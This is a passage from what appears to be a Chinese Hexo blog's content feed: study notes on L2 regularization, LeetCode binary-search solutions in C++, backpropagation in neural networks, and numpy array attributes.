||w||^2</strong></p><p><strong>原先的损失函数转变成结构风险最小化：即损失函数+L2正则。</strong></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221014214304.png" alt="image-20221014214304877"></p><p><strong>二维平面下L2正则化的函数图形是个圆，与方形相比，被磨去了棱角。因此损失函数与L2相交时使得w1或w2等于零的机率小了许多，这就是为什么L2正则化不具有稀疏性的原因</strong></p><h4 id="3-dropout正则化"><a href="#3-dropout正则化" class="headerlink" title="3.dropout正则化"></a>3.dropout正则化</h4><h4 id="4-增加数据集"><a href="#4-增加数据集" class="headerlink" title="4.增加数据集"></a>4.增加数据集</h4><h2 id="欠拟合"><a href="#欠拟合" class="headerlink" title="#欠拟合"></a>#欠拟合</h2>]]></content>
      
      
      
        <tags>
            
            <tag> 深度学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>704.二分查找法</title>
      <link href="/2022/10/14/704-%E4%BA%8C%E5%88%86%E6%B3%95/"/>
      <url>/2022/10/14/704-%E4%BA%8C%E5%88%86%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="简单题"><a href="#简单题" class="headerlink" title="简单题"></a>简单题</h2><h3 id="704-二分查找"><a href="#704-二分查找" class="headerlink" title="704.二分查找"></a>704.二分查找</h3><blockquote><p>题目描述</p></blockquote><p>给定一个 n 个元素<strong>有序</strong>的（升序）整型数组 nums 和一个目标值 target  ，写一个函数搜索 nums 中的 target，如果目标值存在返回下标，否则返回 -1。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode.cn/problems/binary-search">https://leetcode.cn/problems/binary-search</a></p><blockquote><p>示例</p></blockquote><pre class=" language-c++"><code class="language-c++">示例 1:输入: nums = [-1,0,3,5,9,12], target = 9输出: 4解释: 9 出现在 nums 中并且下标为 4示例 2:输入: nums = [-1,0,3,5,9,12], target = 2输出: -1解释: 2 不存在 nums 中因此返回 -1</code></pre><blockquote><p>题解一</p></blockquote><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    int search(vector<int>& nums, int target) &#123;        int left=0;        int right=nums.size()-1;//size() 返回vector 元素的个数        while(left<=right)&#123;            int mid=(left+right)/2;            if(nums[mid]<target)                left=mid+1;            else if(nums[mid]>target)                right=mid-1;            else                return mid;        &#125;        return -1;    &#125;&#125;;</code></pre><blockquote><p>题解二</p></blockquote><pre><code>class Solution &#123;public:    // 循环==递归操作    int search(vector&lt;int&gt;&amp; nums, int target) &#123;        int left=0;        int right=nums.size()-1;//size() 返回vector 元素的个数        return find(nums,target,left,right);    &#125;public:    int  find(vector&lt;int&gt; &amp; nums,int target,int left,int right)&#123;        if(left&lt;=right)&#123;            int mid=(left+right)/2;            if(nums[mid]&lt;target)                return find(nums,target,mid+1,right);            else if(nums[mid]&gt;target)                return find(nums,target,left,mid-1);            else                return mid;        &#125;        return -1;    &#125;&#125;;</code></pre><p><strong>复杂度分析</strong></p><ul><li>时间复杂度：<em>O</em>(log<em>n</em>)，其中 n是数组的长度。</li><li>空间复杂度：O(1)。</li></ul><p><strong>注意：解法是左闭合右闭合</strong></p><blockquote><p>题目的思考</p></blockquote><ol><li><p>为什么是 mid=(left+right)/2 而不是 mid=left+(right-left)/2。</p><p><strong>本质上两个是等价的。</strong></p></li><li><p>为什么<strong>循环是带等于号（left&lt;=right)的</strong> 由于数据集是左闭右闭====》[,,,,,,,,,,,,,,]</p><p>此时的数据集是[    1    ] ，此时是可以取到数据1的。 则 left=0,right =0 是可以走循环的,如果数据是左闭右开即</p><p>[   1  ) 此时数据集中就没有数据。即left=0, right=0 。就不能有等于号。</p><p><strong>类似于 区间的开闭</strong></p></li></ol><h3 id="35-搜索插入位置"><a href="#35-搜索插入位置" class="headerlink" title="35.搜索插入位置"></a>35.搜索插入位置</h3><blockquote><p>题目描述</p></blockquote><p>给定一个排序数组和一个目标值，在数组中找到目标值，并返回其索引。如果目标值不存在于数组中，返回它将会被按顺序插入的位置。</p><p>请必须使用时间复杂度为 O(log n) 的算法。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode.cn/problems/search-insert-position">https://leetcode.cn/problems/search-insert-position</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><blockquote><p>示例</p></blockquote><pre class=" language-c++"><code class="language-c++">示例 1:输入: nums = [1,3,5,6], target = 5输出: 2示例 2:输入: nums = [1,3,5,6], target = 2输出: 1示例 3:输入: nums = [1,3,5,6], target = 7输出: 4</code></pre><blockquote><p>题解</p></blockquote><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    int searchInsert(vector<int>& nums, int target) &#123;        int left=0;        int right=nums.size()-1;        while(left<=right)&#123;            int mid=(left+right)/2;            if(nums[mid]<target)                left=mid+1;            else if(nums[mid]>target)                right=mid-1;            else                return mid;        &#125;        return left;    &#125;&#125;;</code></pre><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221015101526.png" alt="image-20221015101519361"></p><h3 id="69-x-的平方根"><a href="#69-x-的平方根" class="headerlink" title="69. x 的平方根 "></a><a href="https://leetcode.cn/problems/sqrtx/">69. x 的平方根 </a></h3><blockquote><p>题目描述</p></blockquote><p>给你一个非负整数 x ，计算并返回 x 的 算术平方根 。</p><p>由于返回类型是整数，结果只保留 整数部分 ，小数部分将被 舍去 。</p><p>注意：不允许使用任何内置指数函数和算符，例如 pow(x, 0.5) 或者 x ** 0.5 。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode.cn/problems/sqrtx">https://leetcode.cn/problems/sqrtx</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><blockquote><p>示例</p></blockquote><pre class=" language-c++"><code class="language-c++">示例 1：输入：x = 4输出：2示例 2：输入：x = 8输出：2解释：8 的算术平方根是 2.82842..., 由于返回类型是整数，小数部分将被舍去。来源：力扣（LeetCode）链接：https://leetcode.cn/problems/sqrtx著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><blockquote><p>题解</p></blockquote><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    int mySqrt(int x) &#123;        if (x==0||x==1)//如果0，1就直接返回        return x;        long long int left=0;//为什用long long 因为 mid=(left+right)/2会溢出 整形 int 不可以        long long int right=x-1;        while(left<=right)&#123;          long long int  mid=(left+right)/2;            if((mid*mid)>x)//判断当前的值的平方大于目标值，故目标值算术平方根应该在当前值左边                right=mid-1;            else if((mid*mid)<x)                left=mid+1;            else                 return mid;//找到目标值        &#125;        return right;//这个和搜索一个值在有序数组中的位置一样。只不过这个是向下取整    &#125;&#125;;</code></pre><h2 id="中等题"><a href="#中等题" class="headerlink" title="中等题"></a>中等题</h2><h3 id="34-在排序数组中查找元素的第一个和最后一个位置"><a href="#34-在排序数组中查找元素的第一个和最后一个位置" class="headerlink" title="34. 在排序数组中查找元素的第一个和最后一个位置"></a>34. 在排序数组中查找元素的第一个和最后一个位置</h3><blockquote><p>题目描述</p></blockquote><p>给你一个按照非递减顺序排列的整数数组 nums，和一个目标值 target。请你找出给定目标值在数组中的开始位置和结束位置。</p><p>如果数组中不存在目标值 target，返回 [-1, -1]。</p><p>你必须设计并实现时间复杂度为 O(log n) 的算法解决此问题。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode.cn/problems/find-first-and-last-position-of-element-in-sorted-array">https://leetcode.cn/problems/find-first-and-last-position-of-element-in-sorted-array</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><blockquote><p>示例</p></blockquote><pre class=" language-c++"><code class="language-c++">示例 1：输入：nums = [5,7,7,8,8,10], target = 8输出：[3,4]示例 2：输入：nums = [5,7,7,8,8,10], target = 6输出：[-1,-1]示例 3：输入：nums = [], target = 0输出：[-1,-1]来源：力扣（LeetCode）链接：https://leetcode.cn/problems/find-first-and-last-position-of-element-in-sorted-array著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><blockquote><p>题解</p></blockquote><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    vector<int> searchRange(vector<int>& nums, int target) &#123;        int upper = UperRange(nums,target);         int low =LowRange(nums,target);           if(low>upper)&#123;          return  vector<int>&#123;-1,-1&#125;;                    &#125;         return vector<int>&#123;low,upper&#125;;             &#125;//寻找下边界    int LowRange(vector<int> &nums,int target)&#123;        int left=0;        int right=nums.size()-1;        while(left<=right)&#123;            int mid=(left+right)/2;            if(nums[mid]>=target)                right=mid-1;            else                left=mid+1;        &#125;        return left;    &#125;//寻找上边界            int UperRange(vector<int> &nums,int target)&#123;        int left=0;        int right=nums.size()-1;        while(left<=right)&#123;            int mid=(left+right)/2;            if(nums[mid]<=target)//如果中间值小于等于目标值，所以left=mid+1 疑问为啥是等于号时也要左指针移动。因为说明目标值在mid以及mid右侧,所以我要往右边找即[mid+1,right]这个区间找，相当于在一个新的数据集再次找target，如果中间再次等于target，再次向右边推进。                left=mid+1;            else                right=mid-1;        &#125;        return right;    &#125;&#125;;</code></pre><p>参考连接:<a href="https://programmercarl.com/0034.%E5%9C%A8%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84%E4%B8%AD%E6%9F%A5%E6%89%BE%E5%85%83%E7%B4%A0%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%92%8C%E6%9C%80%E5%90%8E%E4%B8%80%E4%B8%AA%E4%BD%8D%E7%BD%AE.html#%E6%80%9D%E8%B7%AF">代码随想录 (programmercarl.com)</a></p><p><strong>注意寻找左边界：</strong></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221015164606.png" alt="image-20221015164606087"></p><p>右边界同理</p><h2 id="困难题"><a href="#困难题" class="headerlink" title="困难题"></a>困难题</h2><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h2 id="题解参考连接"><a href="#题解参考连接" class="headerlink" title="题解参考连接"></a>题解参考连接</h2><p>简单：<a href="https://leetcode.cn/problems/search-insert-position/solution/te-bie-hao-yong-de-er-fen-cha-fa-fa-mo-ban-python-/">写对二分查找不是套模板并往里面填空，需要仔细分析题意 - 搜索插入位置 - 力扣（LeetCode）</a><br>变体：<a href="https://leetcode.cn/problems/search-insert-position/solution/yi-wen-dai-ni-gao-ding-er-fen-cha-zhao-j-69ao/">一文带你搞定二分查找及其多个变种！ - 搜索插入位置 - 力扣（LeetCode）</a></p><p>参考视频：<a href="https://www.bilibili.com/video/BV1kt4y1p7FY/?spm_id_from=333.999.0.0&vd_source=5e8f069711510b3788382a0a03ff38e5">8-1 「二分查找」的基本思想_哔哩哔哩_bilibili</a></p><p><a href="https://space.bilibili.com/236935093">liweiwei1419的个人空间_哔哩哔哩_bilibili</a></p><h2 id="题目的思考"><a href="#题目的思考" class="headerlink" title="题目的思考"></a>题目的思考</h2><h2 id="评论区-有趣的评论"><a href="#评论区-有趣的评论" class="headerlink" title="评论区 有趣的评论"></a>评论区 有趣的评论</h2><p>我不知道同学们寒假有没有刷题。 </p><p>同学们刷题，我也刷题，收益是（0,0）； 同学们不刷题，我刷题，收益是(-1,2); 同学们刷题，我不刷题，收益是（2，-1）； 同学们和我都不刷题，收益是（0,0）；</p><p> 先<strong>假设</strong>一个大<strong>多数</strong>人都有的<strong>偏好是绝对成立</strong>的：<strong>每个人都想过得更好，都想变优秀，和竞争呢对手拉开差距。</strong></p><p> 从我的角度，只要刷题，就还有机会获胜，所以我选择刷题。 聪明的同学也会知道我和其他人会选择刷题，所以他也会选择刷题。 最终，大家都选择刷题了，结果跟没刷是一样的。 <strong>明明我们付出了努力，但为什么没有回报呢？这就是内卷</strong>。 <strong>那如何打破这个平衡呢？ 平衡发生的原因有一条是因为信息的封闭性，打破这个封闭性，就能打破平衡</strong>。 这也是“”<strong>囚徒困境“”当中的串供现象</strong>。具体操作就是<strong>，对于每个聪明的人，你要搞清楚其他人有没有在刷题，然后再选择是否刷题</strong>。 那么就会<strong>发生一个奇怪的现象，每个人都在观望其他人是不是在学习，直接卡在这里了。</strong>这，就是<strong>操作系统中的死锁现象</strong>。 <strong>那如何打破死锁现象呢？ 死锁是资源分配导致的问题</strong>，在这里的资源就相当于 <strong>其他人是否在学习的这个信息。</strong> 所以，<strong>只要有人在刷题并且让别人知道他在刷题，其他人的资源需求就能被满足。 死锁现象就会被打破。</strong></p><p> 回到题目开头，总结一下前提条件： 1.一个偏好。每个人都想过得更好，都想和别人拉开差距。 2.聪明人。 3.量化的收益。可能有些人不刷题的收益要比刷题的高出很多，现实中的环境是比较复杂的。</p>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习:神经网络</title>
      <link href="/2022/10/08/BP%E7%AE%97%E6%B3%95/"/>
      <url>/2022/10/08/BP%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="神经网络"><a href="#神经网络" class="headerlink" title="神经网络"></a>神经网络</h1><h2 id="1-神经元"><a href="#1-神经元" class="headerlink" title="1.神经元"></a>1.神经元</h2><blockquote><p>来源</p></blockquote><p>神经网络中最基本的单元是神经元模型（neuron）。在生物神经网络的原始机制中，每个神经元通常都有多个树突（dendrite），一个轴突（axon）和一个细胞体（cell body），树突短而多分支，轴突长而只有一个；在功能上，树突用于传入其它神经元传递的神经冲动，而轴突用于将神经冲动传出到其它神经元，当树突或细胞体传入的神经冲动使得神经元兴奋时，该神经元就会通过轴突向其它神经元传递兴奋。</p><p><img src="https://img-blog.csdnimg.cn/20191107111849684.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjQ1MDc3,size_16,color_FFFFFF,t_70" alt="神经元"></p><blockquote><p>结构</p></blockquote><p>每个<strong>神经元</strong>都是一个<strong>多输入单输出</strong>的信息处理单元，<strong>输入信号通过带权重的连接传递</strong>，<strong>和阈值对比后得到总输入值</strong>，再<strong>通过激活函数(activation function)的处理产生单个输出</strong>。</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220927212843.png" alt="image-20220927212843886"></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929120431.png" alt="image-20220929120431065"></p><h2 id="2-简单神经元-感知机"><a href="#2-简单神经元-感知机" class="headerlink" title="2.简单神经元:感知机"></a>2.简单神经元:感知机</h2><p>感知机作用：如果数据集是线性可分，则一定存在一个超平面使数据集分开。</p><p>感知机（Perceptron）是由单层神经元组成的一个简单模型，但只有输出层是M-P神经元，即只有输出层神经元进行激活函数处理，也称为功能神经元（functional neuron）；输入层只是接受外界信号（样本属性）并传递给输出层（输入层的神经元个数等于样本的属性数目）。</p><p>感知机能很容易地实现逻辑<strong>与、或、非</strong>运算</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220928112828.png" alt="image-20220928112827936"></p><h2 id="3-多层神经元"><a href="#3-多层神经元" class="headerlink" title="3.多层神经元"></a>3.多层神经元</h2><p>由于感知机单层神经元无法解决异或问题（非线性可分问题）：使用多层功能神经元。</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929080922.png" alt="image-20220929080922565"></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221006150107.png" alt="image-20221006150107171"></p><p>隐藏层：输出层与输入层之间的一层神经元</p><p><strong>隐含层和输出层</strong>神经元都是拥<strong>有激活函数的功能神经元</strong>即<strong>拥有阈值功能</strong>。</p><p>　常见的神经网络，<strong>每层神经元与下一层神经元全互连</strong>，<strong>神经元之间不存在同层连接</strong>，也<strong>不存在跨层连接</strong>。这样的神经网络结构通常称为“<strong>多层前馈神经网络</strong>”（这里的“前馈”指的是网络拓扑结构中<strong>不存在环或回路</strong>，而不是指该网络只能向前传播而不能向后传播），其中输入层神经网络接收外界输入，隐层与输出层神经元对信号进行加工，最终结果由输出层神经元输出。<strong>神经网络的学习过程，就是根据训练数据来调整神经元之间的“连接权”以及每个功能神经元的阈值</strong>。</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929080935.png" alt="image-20220929080934973"></p><p><strong>神经网络的层数</strong>是这样计算的，<strong>输入层不算</strong>，<strong>从隐藏层开始一直到输出层</strong>，一共<strong>有几层就</strong>代表着这是一个<strong>几层的神经网络</strong>。</p><p>参考链接：</p><p><a href="https://www.cnblogs.com/caolanying/p/16412911.html">机器学习：神经网络（上） - 朝南烟 - 博客园 (cnblogs.com)</a></p><h2 id="4-误差逆传播算法BP"><a href="#4-误差逆传播算法BP" class="headerlink" title="4.误差逆传播算法BP"></a>4.误差逆传播算法BP</h2><p><strong>神经网络的学习过程，就是根据训练数据来调整神经元之间的“连接权”以及每个功能神经元的阈值</strong>：误差逆传播（BP）算法是训练多层网络学习算法最杰出的代表。</p><p>一般而言，<strong>只需包含一个足够多神经元的隐层</strong>，就能<strong>以任意精度逼近任意复杂度的连续函数。</strong>　</p><h3 id="4-1-BP-基本过程"><a href="#4-1-BP-基本过程" class="headerlink" title="4.1 BP 基本过程"></a>4.1 BP 基本过程</h3><ul><li>前向传播计算：由输入层经过隐含层向输出层的计算网络输出</li><li>误差反向逐层传递:网络的期望输出与实际输出之差的误差信号由输出层经过隐含层逐层向输入层传递</li><li>由“前向传播计算”与“误差反向逐层传递”的反复进行的网络训练 过程</li></ul><h3 id="4-2-Bp公式推导"><a href="#4-2-Bp公式推导" class="headerlink" title="4.2 Bp公式推导"></a>4.2 Bp公式推导</h3><blockquote><p>单层前馈神经网络</p></blockquote><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220928114438.png" alt="image-20220928114438611"></p><blockquote><p>基本思想</p></blockquote><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220928115936.png" alt="image-20220928115935930"></p><blockquote><p>sigmoid 导函数特性</p></blockquote><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929082307.png" alt="image-20220929082307489"></p><blockquote><p>E对w的偏导</p></blockquote><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220928121204.png" alt="image-20220928121204206"></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929082635.png" alt="image-20220929082635074"></p><blockquote><p>E对θ偏导</p></blockquote><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929084620.png" alt="image-20220929084620167"></p><blockquote><p>E对 v偏导</p></blockquote><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929085701.png" alt="image-20220929085700948"></p><p>==求和符号的来源==</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929091058.png" alt="image-20220929091058875"></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929103457.png" alt="image-20220929103457697"></p><blockquote><p>E对r偏导</p></blockquote><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929091248.png" alt="image-20220929091248357"></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929104434.png" alt="image-20220929104434182"></p><h2 id="5-局部最小和全局最小"><a href="#5-局部最小和全局最小" class="headerlink" title="5.局部最小和全局最小"></a>5.局部最小和全局最小</h2><p><strong>模型学习的过程</strong>实质上就是一个<strong>寻找最优参数</strong>的过程，例如<strong>BP算法试图通过最速下降来寻找使得累积经验误差最小的权值与阈值，</strong>在谈到最优时，一般会提到局部极小（local minimum）和全局最小（global minimum）。</p><ol><li><code>* 局部极小解：参数空间中的某个点，其邻域点的误差函数值均不小于该点的误差函数值。</code></li><li><code>* 全局最小解：参数空间中的某个点，所有其他点的误差函数值均不小于该点的误差函数值。</code></li></ol><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221006141417.png" alt="image-20221006141410162"></p><p>要<strong>成为局部极小点</strong>，只要满足该点在<strong>参数空间中的梯度为零</strong>。<strong>局部极小可以有多个，而全局最小只有一个</strong>。<strong>全局最小一定是局部极小</strong>，但<strong>局部最小却不一定是全局最小</strong>。显然在很多机器学习算法中，都试图找到目标函数的全局最小。</p><p><strong>梯度下降法的主要思想就是沿着负梯度方向去搜索最优解，负梯度方向是函数值下降最快的方向，</strong>若<strong>迭代到某处的梯度为0</strong>，则表示<strong>达到一个局部最小</strong>，<strong>参数更新停止</strong>。因此在现实任务中，通常使用以下策略尽可能地去接近全局最小。</p><ol><li><code>* 以多组不同参数值初始化多个神经网络，按标准方法训练，迭代停止后，取其中误差最小的解作为最终参数。</code></li><li><code>* 使用“模拟退火”技术。</code></li><li><code>* 使用随机梯度下降，即在计算梯度时加入了随机因素，使得在局部最小时，计算的梯度仍可能不为0，从而迭代可以继续进行。</code></li></ol><h2 id="6-参考链接和书"><a href="#6-参考链接和书" class="headerlink" title="6.参考链接和书"></a>6.参考链接和书</h2><p><a href="https://www.bilibili.com/video/BV1oi4y157XH/?spm_id_from=333.999.0.0&vd_source=5e8f069711510b3788382a0a03ff38e5">机器学习推导_哔哩哔哩_bilibili</a></p><p><a href="https://www.cnblogs.com/BlairGrowing/p/14982115.html">深度学习——前向传播算法和反向传播算法（BP算法）及其推导 - 关注我更新论文解读 - 博客园 (cnblogs.com)</a></p><p><a href="https://www.bookstack.cn/read/Vay-keen-Machine-learning-learning-notes/spilt.4.5.md">5 神经网络 - 5.4 全局最小与局部最小 - 《周志华《机器学习》学习笔记》 - 书栈网 · BookStack</a></p><p>西瓜书：《周志华机器学习》</p>]]></content>
      
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>numpy使用</title>
      <link href="/2022/10/08/numpy%E4%BD%BF%E7%94%A8/"/>
      <url>/2022/10/08/numpy%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="1-numpy-数组属性和方法"><a href="#1-numpy-数组属性和方法" class="headerlink" title="1.numpy 数组属性和方法"></a>1.numpy 数组属性和方法</h2><blockquote><p>数组属性官方介绍</p></blockquote><table><thead><tr><th align="center">属性</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">ndarray.ndim</td><td align="left">秩，即<strong>轴的数量</strong>或维度的数量</td></tr><tr><td align="center">ndarray.shape</td><td align="left"><strong>数组的维度</strong>，对于矩阵，n 行 m 列</td></tr><tr><td align="center">ndarray.size</td><td align="left"><strong>数组元素的总个数</strong>，相当于 .shape 中 n*m 的值</td></tr><tr><td align="center">ndarray.dtype</td><td align="left">ndarray 对象的元素类型</td></tr><tr><td align="center">ndarray.itemsize</td><td align="left">ndarray 对象中每个元素的大小，以字节为单位</td></tr><tr><td align="center">ndarray.flags</td><td align="left">ndarray 对象的内存信息</td></tr><tr><td align="center">ndarray.real</td><td align="left">ndarray元素的实部</td></tr><tr><td align="center">ndarray.imag</td><td align="left">ndarray 元素的虚部</td></tr><tr><td align="center">ndarray.data</td><td align="left">包含实际数组元素的缓冲区，由于一般通过数组的索引获取元素，所以通常不需要使用这个属性。</td></tr><tr><td align="center">ndarray.flat</td><td align="left">数组上的一维迭代器。</td></tr><tr><td align="center">ndarray.base</td><td align="left">Base object if memory is from some other object.</td></tr></tbody></table><ul><li><strong>axis=0，表示沿着第 0 轴进行操作，即对每一列进行操作；</strong></li><li><strong>axis=1，表示沿着第1轴进行操作，即对每一行进行操作。</strong></li></ul><blockquote><p><strong>numpy.ndarray.ndim</strong></p></blockquote><p>返回：维度（秩）</p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> a<span class="token operator">=</span>np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> a<span class="token punctuation">.</span>ndim<span class="token number">2</span><span class="token operator">>></span><span class="token operator">></span> b<span class="token operator">=</span>np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> b<span class="token punctuation">.</span>ndim<span class="token number">3</span><span class="token operator">>></span><span class="token operator">></span> aarray<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">.</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token punctuation">,</span>       <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">.</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> barray<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">.</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">.</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">.</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span>       <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">.</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">.</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">.</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span></code></pre><blockquote><p>ndarray.shape</p></blockquote><p>ndarray.shape <strong>表示数组的维度</strong>，返回一个<strong>元组</strong>，这个元组的长度就是维度的数目，即 ndim 属性(秩)。比如，一个二维数组，其维度表示”行数”和”列数”。</p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> c<span class="token operator">=</span>np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> carray<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>       <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> c<span class="token punctuation">.</span>shape<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span></code></pre><blockquote><p>reshape</p></blockquote><p>来调整数组大小</p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> a <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> b <span class="token operator">=</span> a<span class="token punctuation">.</span>reshape<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> aarray<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token 